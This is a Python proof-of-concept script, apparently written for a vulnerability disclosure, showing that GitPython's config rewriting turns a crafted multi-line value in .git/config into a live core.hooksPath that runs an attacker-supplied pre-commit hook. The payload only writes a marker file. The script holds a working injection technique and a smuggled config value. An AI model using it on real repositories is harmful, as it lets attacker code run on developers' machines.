#!/usr/bin/env python3
"""
GITPYTHON-002 PoC: a dormant, legitimately-encoded multi-line git-config value
(standard quoted + backslash-continuation syntax, containing an escaped "\\n"
that decodes to a real embedded newline in memory) is corrupted into a NEW,
live config key the moment GitConfigParser re-serializes it during any
unrelated write. If the smuggled second "line" looks like
"hooksPath = <attacker path>", it becomes a real, active core.hooksPath after
one unrelated GitPython config write, and fires attacker code on the next
hook-triggering git operation (e.g. `git commit`).

This is CWE-88/CWE-94 style argument/config injection, but via the READ path
(a config file GitPython parses and later rewrites), not via a Python kwarg
argument -- distinct from the already-fixed GHSA-mv93-w799-cj2w /
GHSA-v87r-6q3f-2j67 / GHSA-3rp5-jjmw-4wv2 / GHSA-jm78-9fvv-mhgr, which all
guard the setter-argument surface only.

Run:
  PYTHONPATH="<repo>:<repo>/gitdb:<repo>/smmap" python3 gitpython-002-poc.py <workdir>

Benign: only writes/reads inside <workdir>. The "malicious" hook just writes a
marker file; no destructive/exfiltrating payload. Exits non-zero and prints
"NOT VULNERABLE" if the corruption / hook does not fire.
"""
import os
import subprocess
import sys


def main():
    workdir = sys.argv[1] if len(sys.argv) > 1 else "/tmp/gitpython-002-poc"
    repo_dir = os.path.join(workdir, "repo")
    hooks_dir = os.path.join(workdir, "evil-hooks")
    marker = os.path.join(workdir, "PWNED_MARKER.txt")

    for p in (repo_dir, hooks_dir):
        os.makedirs(p, exist_ok=True)
    if os.path.exists(marker):
        os.remove(marker)

    subprocess.run(["git", "init", "-q", "-b", "main", repo_dir], check=True)
    subprocess.run(["git", "-C", repo_dir, "config", "user.email", "test@example.com"], check=True)
    subprocess.run(["git", "-C", repo_dir, "config", "user.name", "Test"], check=True)

    # Rewrite .git/config with a dormant, 100%-valid multi-line quoted value
    # inside [core] (before any other section). No raw CR/LF/NUL byte is
    # written to disk here -- this is standard git config quoting +
    # backslash-line-continuation, decoded by both real git and GitConfigParser
    # into the Python string 'A\nhooksPath = ../evil-hooks'.
    cfg_path = os.path.join(repo_dir, ".git", "config")
    with open(cfg_path) as f:
        original = f.read()
    poisoned_entry = '\tzzz = "A\\nhooksPath = ../evil-hooks\\\n"\n'
    # Insert right after the [core] header line so it lives in the same section.
    new_config = original.replace("[core]\n", "[core]\n" + poisoned_entry, 1)
    with open(cfg_path, "w") as f:
        f.write(new_config)

    # Confirm it's inert per real git before touching GitPython.
    pre = subprocess.run(
        ["git", "-C", repo_dir, "config", "--get", "core.hookspath"],
        capture_output=True, text=True,
    )
    if pre.returncode == 0:
        print("SETUP ERROR: core.hookspath already set before GitPython touched anything")
        sys.exit(2)

    # Malicious hook: benign marker only.
    hook_path = os.path.join(hooks_dir, "pre-commit")
    with open(hook_path, "w") as f:
        f.write('#!/bin/sh\necho "PWNED-VIA-GITPYTHON-CONFIG-INJECTION" > "%s"\nexit 0\n' % marker)
    os.chmod(hook_path, 0o755)

    import git  # gitpython under test

    repo = git.Repo(repo_dir)
    before = repo.config_reader().get_value("core", "zzz")
    print("core.zzz before any GitPython write =", repr(before))

    # ONE totally unrelated, benign write -- this is the only "attacker-adjacent"
    # action required, and it is something virtually every GitPython consumer
    # does routinely (setting an option, adding a remote, updating a branch's
    # tracking config, ...).
    with repo.config_writer() as cw:
        cw.set_value("user", "name", "Test User")

    post = subprocess.run(
        ["git", "-C", repo_dir, "config", "--get", "core.hookspath"],
        capture_output=True, text=True,
    )
    if post.returncode != 0:
        print("NOT VULNERABLE: core.hookspath still absent after the unrelated write")
        sys.exit(1)

    injected_path = post.stdout.strip()
    print("core.hookspath is now LIVE after one unrelated write:", injected_path)

    # Trigger the hook with a normal commit to prove it fires.
    with open(os.path.join(repo_dir, "file2.txt"), "w") as f:
        f.write("change\n")
    subprocess.run(["git", "-C", repo_dir, "add", "file2.txt"], check=True)
    subprocess.run(
        ["git", "-C", repo_dir, "-c", "user.email=t@example.com", "-c", "user.name=T",
         "commit", "-q", "-m", "trigger hook"],
        check=True,
    )

    if os.path.isfile(marker):
        with open(marker) as f:
            content = f.read().strip()
        print("VULNERABLE: hook fired, marker content =", content)
        sys.exit(0)
    else:
        print("NOT VULNERABLE: hook did not fire")
        sys.exit(1)


if __name__ == "__main__":
    main()
